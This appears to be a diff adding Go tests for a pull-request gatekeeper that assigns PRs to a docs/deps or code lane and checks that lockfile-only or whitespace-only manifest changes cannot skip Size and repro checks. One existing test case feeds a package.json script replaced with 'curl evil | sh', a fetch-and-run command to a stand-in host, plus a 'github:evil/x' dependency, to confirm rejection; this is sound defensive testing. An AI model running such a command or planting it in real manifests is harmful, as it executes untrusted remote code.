@@ -63,6 +63,26 @@ func TestSelectLane(t *testing.T) {
 		"docs image":           {[]string{"docs/assets/shot.png"}, LaneCode},
 		"swift lockfile":       {[]string{"macos/Package.resolved"}, LaneCode},
 		"empty":                {nil, LaneCode},
+		// #182 review: the docs waiver is by file type, not by directory.
+		"docs script":     {[]string{"docs/build.sh"}, LaneCode},
+		"docs go source":  {[]string{"docs/example.go"}, LaneCode},
+		"docs + markdown": {[]string{"docs/cli.md", "docs/build.sh"}, LaneCode},
+		"root readme":     {[]string{"README.md"}, LaneDocsDeps},
+		// Markdown a test or go:embed can read is not documentation.
+		"testdata markdown":     {[]string{"internal/render/testdata/golden.md"}, LaneCode},
+		"root testdata md":      {[]string{"testdata/golden.md"}, LaneCode},
+		"internal markdown":     {[]string{"internal/api/dashboard/help.md"}, LaneCode},
+		"cmd markdown":          {[]string{"cmd/redline/usage.md"}, LaneCode},
+		"nested readme outside": {[]string{"marketing/video/README.md"}, LaneDocsDeps},
+		// #182 review: only lockfiles whose manifest is also admitted may
+		// enter the lane; generic *.lock, Cargo, Swift and Gradle stay in the
+		// code lane, so they cannot use the lane to skip repro.
+		"cargo lock":            {[]string{"Cargo.lock"}, LaneCode},
+		"cargo pair":            {[]string{"Cargo.toml", "Cargo.lock"}, LaneCode},
+		"generic lock":          {[]string{"tools/foo.lock"}, LaneCode},
+		"swift pair":            {[]string{"macos/Package.swift", "macos/Package.resolved"}, LaneCode},
+		"gradle pair":           {[]string{"android/build.gradle", "android/gradle.lockfile"}, LaneCode},
+		"go.sum only (lane ok)": {[]string{"go.sum"}, LaneDocsDeps},
 	}
 	for name, tc := range cases {
 		var pr PRInfo
@@ -145,6 +165,49 @@ func TestLockfileOnlyBumpStillFailsSize(t *testing.T) {
 	}
 }
 
+// #182 review: lockfile-only PRs must not pass both Size and the lane's
+// replacement for Test Repro. Every lockfile the lane admits has a manifest
+// mapping in checkSize, so each one fails Size on its own.
+func TestDocsDepsLockfileOnlyPRsFailSize(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	for lockfile := range depLockfiles {
+		for _, dir := range []string{"", "web/"} {
+			name := dir + lockfile
+			res := eval.Evaluate(passingPR(PRFile{Filename: name, Additions: 4, Deletions: 4}), nil, nil)
+			if res.Lane != LaneDocsDeps {
+				t.Fatalf("%s: lane = %s", name, res.Lane)
+			}
+			if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "without matching") {
+				t.Errorf("%s: Size = %+v, want lockfile-without-manifest failure", name, r)
+			}
+			if res.Verdict != VerdictWouldNotMerge {
+				t.Errorf("%s: lockfile-only PR must not be called eligible", name)
+			}
+		}
+	}
+}
+
+// A paired manifest edit that changes no version (whitespace only) would
+// satisfy the lockfile-needs-manifest check without being a bump. File Types
+// rejects it, so a disguised lockfile-only PR still cannot pass the lane.
+func TestDocsDepsWhitespaceManifestDoesNotCoverLockfile(t *testing.T) {
+	eval := NewEvaluator(DefaultConfig())
+	pr := passingPR(
+		PRFile{Filename: "go.mod", Additions: 1, Patch: "@@ -1,2 +1,3 @@\n module x\n+\n go 1.26"},
+		PRFile{Filename: "go.sum", Additions: 4, Deletions: 4},
+	)
+	res := eval.Evaluate(pr, nil, nil)
+	if res.Lane != LaneDocsDeps {
+		t.Fatalf("lane = %s", res.Lane)
+	}
+	if r := ruleByName(t, res, "File Types"); r.Pass || !strings.Contains(r.Message, "changes no version") {
+		t.Errorf("File Types = %+v, want no-version failure", r)
+	}
+	if res.Verdict != VerdictWouldNotMerge {
+		t.Error("whitespace manifest + lockfile must not be called eligible")
+	}
+}
+
 func TestDocsDepsManifestEditsMustBeVersionBumps(t *testing.T) {
 	eval := NewEvaluator(DefaultConfig())
 	cases := []struct {
@@ -160,6 +223,7 @@ func TestDocsDepsManifestEditsMustBeVersionBumps(t *testing.T) {
 		{"package.json script", PRFile{Filename: "package.json", Patch: "@@ -3 +3 @@\n-    \"test\": \"playwright test\",\n+    \"test\": \"curl evil | sh\","}, false, "not a version bump"},
 		{"package.json git dep", PRFile{Filename: "package.json", Patch: "@@ -8 +8 @@\n+    \"x\": \"github:evil/x\""}, false, "not a version bump"},
 		{"manifest without patch", PRFile{Filename: "package.json"}, false, "no diff available"},
+		{"go.mod blank line only", PRFile{Filename: "go.mod", Patch: "@@ -1,2 +1,3 @@\n module x\n+\n go 1.26"}, false, "changes no version"},
 	}
 	for _, tc := range cases {
 		r := eval.checkDocsDepsFiles(PRInfo{Files: []PRFile{tc.file}})
